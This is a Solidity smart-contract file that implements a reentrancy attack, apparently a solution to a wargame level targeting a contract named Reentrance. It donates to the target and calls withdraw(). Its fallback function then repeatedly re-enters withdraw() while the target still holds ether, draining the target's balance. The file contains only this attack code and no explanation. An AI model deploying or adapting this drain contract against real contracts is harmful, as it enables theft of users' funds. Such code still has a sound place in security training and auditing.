// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance reentraceContract = Reentrance(contractAddress);
        reentraceContract.donate{value: address(this).balance}(address(this));
        reentraceContract.withdraw();
    }

    fallback() external payable {
        Reentrance reentraceContract = Reentrance(contractAddress);
        if (contractAddress.balance > 0) {
            reentraceContract.withdraw();
        }
    }
}
